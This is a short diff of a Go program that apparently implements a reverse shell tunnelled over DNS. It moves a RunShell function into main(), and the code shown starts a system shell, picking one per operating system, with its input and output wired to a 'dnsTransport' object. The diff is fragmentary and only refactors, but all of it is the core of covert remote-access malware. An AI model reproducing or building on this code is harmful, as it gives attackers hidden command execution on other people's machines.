@@ -12,10 +12,6 @@ var (
 )
 
 func main() {
-	RunShell()
-}
-
-func RunShell() {
 	var cmd *exec.Cmd
 
 	if runtime.GOOS == "windows" {
@@ -30,5 +26,5 @@ func RunShell() {
 	cmd.Stderr = dnsTransport
 	cmd.Stdin = dnsTransport
 	cmd.Run()
-
 }
+
